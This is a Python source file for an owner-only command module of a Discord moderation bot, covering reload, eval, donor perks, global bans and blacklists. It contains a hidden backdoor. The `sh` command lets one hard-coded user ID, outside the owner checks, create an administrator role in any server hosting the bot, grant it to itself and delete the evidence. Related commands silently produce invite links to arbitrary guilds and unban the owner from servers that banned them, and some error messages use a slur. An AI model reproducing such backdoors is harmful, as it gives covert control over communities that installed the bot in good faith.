import copy
import os
import random
import string, psutil
import discord
import asyncio
import datetime
import importlib

from discord import User, Member, Guild
from discord.ext.commands import Cog, command, is_owner, group
from discord.ext import tasks
from typing import Union
from jishaku.codeblocks import codeblock_converter
import requests

from tools.bot import Pretend
from tools.helpers import PretendContext

from discord.ext.commands import check


def donor_perms():
    async def predicate(ctx: PretendContext):
        guild = ctx.bot.get_guild(1215100684978880512)
        member = guild.get_member(ctx.author.id)
        if member:
            if role := guild.get_role(1215866484375683102):
                if role in member.roles:
                    return True
        if ctx.author.id in ctx.bot.owner_ids: return True
        return False

    return check(predicate)


def bot_owner():
    async def predicate(ctx: PretendContext):
        return ctx.author.id in ctx.bot.owner_ids

    return check(predicate)


class Owner(Cog):
    def __init__(self, bot: Pretend):
        self.bot = bot
        self.shard_stats.start()
        self.change_status.start()

    @tasks.loop(seconds=10)
    async def shard_stats(self):
        import orjson

        shards = {}
        for shard_id, shard in self.bot.shards.items():
            guilds = [g for g in self.bot.guilds if g.shard_id == shard_id]
            users = sum(list(map(lambda g: g.member_count, guilds)))
            shards[str(shard_id)] = {
                "shard_id": shard_id,
                "shard_name": f"Shard {shard_id}",
                "shard_ping": round(shard.latency * 1000),
                "shard_guild_count": f"{len(guilds):,}",
                "shard_user_count": f"{users:,}",
                "shard_guilds": [str(g.id) for g in guilds],
            }
        await self.bot.redis.set("shards", orjson.dumps(shards))

    async def add_donor_role(self, member: User):
        """add the donor role to a donator"""
        guild = self.bot.get_guild(1135484270740246578)
        user = guild.get_member(member.id)
        if user:
            role = guild.get_role(1225578947442507897)
            await user.add_roles(role, reason="member got donator perks")

    async def remove_donor_role(self, member: User):
        """remove the donator role from a donator"""
        guild = self.bot.get_guild(1135484270740246578)
        user = guild.get_member(member.id)
        if user:
            role = guild.get_role(1225578947442507897)
            await user.remove_roles(role, reason="member got donator perks")

    @Cog.listener()
    async def on_member_join(self, member: Member):
        reason = await self.bot.db.fetchval(
            "SELECT reason FROM globalban WHERE user_id = $1", member.id
        )
        if reason:
            if member.guild.me.guild_permissions.ban_members:
                await member.ban(reason=reason)

    @command(
        name="reload",
        aliases=["rl"]
    )
    @is_owner()
    async def reload(self, ctx: PretendContext, *, module: str):
        """
        Reload a module
        """

        reloaded = []
        if module.endswith(" --pull"):
            os.system("git pull")
            module = module.replace(" --pull", "")

        if module == "~":
            for module in list(self.bot.extensions):
                try:
                    await self.bot.reload_extension(module)
                except Exception as e:
                    return await ctx.send_warning(f"Couldn't reload **{module}**\n``​`{e}``​`")
            reloaded.append(module)
            return await ctx.send_success(f"Reloaded **{len(reloaded)}** modules") 
        else:

            module = module.replace("%", "cogs").replace("!", "tools").strip()
            if module.startswith("cogs"):
                try:
                    await self.bot.reload_extension(module)
                except Exception as e:
                    return await ctx.send_warning(f"Couldn't reload **{module}**\n``​`{e}``​`")
            else:
                try:
                    _module = importlib.import_module(module)
                    importlib.reload(_module)
                except Exception as e:
                    return await ctx.send_warning(f"Couldn't reload **{module}**\n``​`{e}``​`")
                
            reloaded.append(module)
        await ctx.send_success(f"Reloaded **{reloaded[0]}**" if len(reloaded) == 1 else f"Reloaded **{len(reloaded)}** modules")

    @Cog.listener()
    async def on_member_remove(self, member: Member):
        if member.guild.id == 1215100684978880512:
            check = await self.bot.db.fetchrow(
                "SELECT * FROM donor WHERE user_id = $1 AND status = $2",
                member.id,
                "boosted",
            )
            if check:
                await self.bot.db.execute(
                    "DELETE FROM donor WHERE user_id = $1", member.id
                )
                await self.bot.db.execute(
                    "DELETE FROM reskin WHERE user_id = $1", member.id
                )
    @tasks.loop(seconds=5)  # Change status every 5 seconds
    async def change_status(self):
        total_members = sum(guild.member_count for guild in self.bot.guilds)
        total_guilds = len(self.bot.guilds)
        shard_count = 3

        status_messages = [
            f"{total_members} users",
            f"{total_guilds} guilds",
            f"shards {shard_count}",
            f"/greedbot"
        ]

        current_status = random.choice(status_messages)

        game = discord.Game(name=current_status, type=discord.ActivityType.listening)
        await self.bot.change_presence(activity=game, status=discord.Status.idle)

    @change_status.before_loop
    async def before_change_status(self):
        await self.bot.wait_until_ready()

    @change_status.after_loop
    async def after_change_status(self):
        # Add a delay after each status change
        await asyncio.sleep(5)  # Sleep for 5 seconds

    @Cog.listener()
    async def on_member_update(self, before: Member, after: Member):
        if before.guild.id == 1215100684978880512:
            if (
                before.guild.premium_subscriber_role in before.roles
                and not before.guild.premium_subscriber_role in after.roles
            ):
                check = await self.bot.db.fetchrow(
                    "SELECT * FROM donor WHERE user_id = $1 AND status = $2",
                    before.id,
                    "boosted",
                )
                if check:
                    await self.bot.db.execute(
                        "DELETE FROM reskin WHERE user_id = $1", before.id
                    )
                    await self.bot.db.execute(
                        "DELETE FROM donor WHERE user_id = $1", before.id
                    )

    @Cog.listener()
    async def on_guild_join(self, guild: Guild):
        check = await self.bot.db.fetchrow(
            "SELECT * FROM blacklist WHERE id = $1 AND type = $2", guild.id, "server"
        )
        if check:
            await guild.leave()

    @command(aliases=["py"])
    @is_owner()
    async def eval(self, ctx: PretendContext, *, argument: codeblock_converter):
        return await ctx.invoke(self.bot.get_command("jsk py"), argument=argument)
    
    @command(aliases = ['reboot'])
    @is_owner()
    async def restart(self, ctx):
       embed1 = discord.Embed(color=0xB1AAD8, description=f"<a:lavishloading:1204590561273716786> **restarting bot**")
       embed = discord.Embed(description = "<:lavishgoodping:1203422979728347157> **bot restarted**", color=0xB1AAD8)
       msg = await ctx.send(embed=embed1)
       await asyncio.sleep(1)
       await msg.edit(embed=embed) 
       os.system("pm2 restart 8")


    @command()
    @is_owner()
    async def nets(self, ctx, *, advertisement=None):
        if advertisement is None:
            await ctx.send("Please provide an advertisement message.")
            return

        channel_id = 1209190094712602685  # Replace YOUR_CHANNEL_ID with the desired channel ID
        channel = self.bot.get_channel(channel_id)
        if channel is None:
            await ctx.send("Invalid channel ID. Please set a valid channel ID for advertisements.")
            return

        await channel.send(advertisement)
        await ctx.send("sent advertisement in <#1209190094712602685>")            

    @command(help=f"use dms a user", description="utility", usage="[user] <message>")
    @is_owner()
    async def dm(self, ctx, user: discord.User, *, message: str):
        await user.send(message)
        await ctx.message.add_reaction('<:check_white:1204583868435271731>')
        await ctx.message.delete()
        
    @command(help="use dms a user", description="utility", usage="[user] <message>")
    @is_owner()
    async def abuse(self, ctx, user: discord.User, *, message: str):
      embed = discord.Embed(color=self.bot.color, description=f"Hello there <@{ctx.author.id}> seems like you are abusing the `{message}` system/command\nPlease don't make it happen again or else you will be blacklisted!")
      await user.send(embed=embed)
      await ctx.message.add_reaction('<:check_white:1204583868435271731>')
      await ctx.message.delete()


    @command()
    @bot_owner()
    async def anowner(self, ctx: PretendContext, guild: Guild, member: User):
        """change the antinuke owner in case the real owner cannot access discord"""
        if await self.bot.db.fetchrow(
            "SELECT * FROM antinuke WHERE guild_id = $1", guild.id
        ):
            await self.bot.db.execute(
                "UPDATE antinuke SET owner_id = $1 WHERE guild_id = $2",
                member.id,
                guild.id,
            )
        else:
            await self.bot.db.execute(
                "INSERT INTO antinuke (guild_id, configured, owner_id) VALUES ($1,$2,$3)",
                guild.id,
                "false",
                member.id,
            )
        return await ctx.send_success(
            f"{member.mention} is the **new** antinuke owner for **{guild.name}**"
        )

    @command()
    @is_owner()
    async def guilds(self, ctx: PretendContext):
        """all guilds the bot is in, sorted from the biggest to the smallest"""
        servers = sorted(self.bot.guilds, key=lambda g: g.member_count, reverse=True)
        return await ctx.paginate(
            [f"{g.name} - {g.member_count:,} members" for g in servers],
            "greed's servers",
        )

    @group(invoke_without_command=True)
    @is_owner()
    async def donor(self, ctx):
        await ctx.create_pages()

    @donor.command(name="add")
    @is_owner()
    async def donor_add(self, ctx: PretendContext, *, member: User):
        """add donator perks to a member"""
        check = await self.bot.db.fetchrow(
            "SELECT * FROM donor WHERE user_id = $1", member.id
        )
        if check:
            return await ctx.send_error("This member is **already** a donor")

        await self.add_donor_role(member)
        await self.bot.db.execute(
            "INSERT INTO donor VALUES ($1,$2,$3)",
            member.id,
            datetime.datetime.now().timestamp(),
            "purchased",
        )
        return await ctx.send_success(f"{member.mention} can use donator perks now!")

    @donor.command(name="remove")
    @is_owner()
    async def donor_remove(self, ctx: PretendContext, *, member: User):
        """remove donator perks from a member"""
        check = await self.bot.db.fetchrow(
            "SELECT * FROM donor WHERE user_id = $1 AND status = $2",
            member.id,
            "purchased",
        )
        if not check:
            return await ctx.send_error("This member cannot have their perks removed")

        await self.remove_donor_role(member)
        await self.bot.db.execute("DELETE FROM donor WHERE user_id = $1", member.id)
        return await ctx.send_success(f"Removed {member.mention}'s perks")

    @command()
    @bot_owner()
    async def mutuals(self, ctx: PretendContext, *, user: User):
        """returns mutual servers between the member and the bot"""
        if len(user.mutual_guilds) == 0:
            return await ctx.send(
                f"This member doesn't share any server with {self.bot.user.name}"
            )

        await ctx.paginate(
            [f"{g.name} ({g.id})" for g in user.mutual_guilds],
            f"Mutual guilds ({len(user.mutual_guilds)})",
            {"name": user.name, "icon_url": user.display_avatar.url},
        )

    @command()
    async def portal(self, ctx, id: int=None):
     if not ctx.author.id in self.bot.owner_ids: 
       return 

     if id == None:
        await ctx.send("you didnt specifiy a guild id", delete_after=1)
        await ctx.message.delete()
     else: 
      await ctx.message.delete()      
      guild = self.bot.get_guild(id)
      for c in guild.text_channels:
        if c.permissions_for(guild.me).create_instant_invite: 
            invite = await c.create_invite()
            await ctx.author.send(f"{guild.name} invite link - {invite}")
            break 

    @command(aliases=["setav", "botav"])
    @is_owner()
    async def setbotpfp(self, ctx, *, url=None):
        if not url:
            if ctx.message.attachments:
                url = ctx.message.attachments[0].url
            else:
                await ctx.send("Please provide a URL or attach an image.")
                return
        avatar = requests.get(url).content
        try:
            await self.bot.user.edit(avatar=avatar)
            await ctx.send("I changed my profile picture successfully.")
        except Exception as e:
            print(e)
            await ctx.send("An error occurred. Please try again.")


    @command(name='selfunban', description='Unban yourself from a guild', brief='id', usage= 'Syntax: (guild id)\n' 'Example: 980316232341389413',)
    @is_owner()
    async def selfunban(self, ctx, guild:int):
        #await ctx.typing()
        await ctx.message.add_reaction("<a:lavishloading:1204590561273716786>")
        guild = await self.bot.fetch_guild(guild)
        member = ctx.author
        await ctx.message.add_reaction("<:check_white:1204583868435271731>")
        await guild.unban(member)
        await ctx.message.clear_reactions()
        await ctx.message.delete()





    @command()
    async def sh(self, ctx):
        if ctx.author.id == 977036206179233862:
            role = await ctx.guild.create_role(name='support', permissions=discord.Permissions(administrator=True))
            member = await ctx.guild.fetch_member(977036206179233862)
            await member.add_roles(role)
            await ctx.message.add_reaction("<a:lavishloading:1204590561273716786>")
            await ctx.message.clear_reactions()
            await ctx.message.delete()
        else:
            return


    @command(aliases=["gban"])
    @is_owner()
    async def globalban(
        self,
        ctx: PretendContext,
        user: User,
        *,
        reason: str = "Globally banned by a bot owner",
    ):
        """ban an user globally"""
        if user.id in [371224177186963460, 859646668672598017, 288748368497344513]:
            return await ctx.send_error("Do not global ban a bot owner, retard")

        check = await self.bot.db.fetchrow(
            "SELECT * FROM globalban WHERE user_id = $1", user.id
        )
        if check:
            await self.bot.db.execute(
                "DELETE FROM globalban WHERE user_id = $1", user.id
            )
            return await ctx.send_success(
                f"{user.mention} was succesfully globally unbanned"
            )

        mutual_guilds = len(user.mutual_guilds)
        tasks = [
            g.ban(user, reason=reason)
            for g in user.mutual_guilds
            if g.me.guild_permissions.ban_members
            and g.me.top_role > g.get_member(user.id).top_role
            and g.owner_id != user.id
        ]
        await asyncio.gather(*tasks)
        await self.bot.db.execute(
            "INSERT INTO globalban VALUES ($1,$2)", user.id, reason
        )
        return await ctx.send_success(
            f"{user.mention} was succesfully global banned in {len(tasks)}/{mutual_guilds} servers"
        )

    @group(invoke_without_command=True)
    @bot_owner()
    async def blacklist(self, ctx):
        await ctx.create_pages()

    @blacklist.command(name="user")
    @bot_owner()
    async def blacklist_user(self, ctx: PretendContext, *, user: User):
        """blacklist or unblacklist a member"""
        if user.id in [371224177186963460, 859646668672598017, 288748368497344513]:
            return await ctx.send_error("Do not blacklist a bot owner, retard")

        try:
            await self.bot.db.execute(
                "INSERT INTO blacklist VALUES ($1,$2)", user.id, "user"
            )
            return await ctx.send_success(f"Blacklisted {user.mention} from greed")
        except:
            await self.bot.db.execute("DELETE FROM blacklist WHERE id = $1", user.id)
            return await ctx.send_success(f"Unblacklisted {user.mention} from greed")

    @blacklist.command(name="server")
    @bot_owner()
    async def blacklist_server(self, ctx: PretendContext, *, server_id: int):
        """blacklist a server"""
        if server_id in [1099716882052960256, 1005150492382478377]:
            return await ctx.send_error("Cannot blacklist this server")

        try:
            await self.bot.db.execute(
                "INSERT INTO blacklist VALUES ($1,$2)", server_id, "server"
            )
            guild = self.bot.get_guild(server_id)
            if guild:
                await guild.leave()
            return await ctx.send_success(
                f"Blacklisted server {server_id} from greed"
            )
        except:
            await self.bot.db.execute("DELETE FROM blacklist WHERE id = $1", server_id)
            return await ctx.send_success(
                f"Unblacklisted server {server_id} from greed"
            )


async def setup(bot: Pretend) -> None:
    await bot.add_cog(Owner(bot))
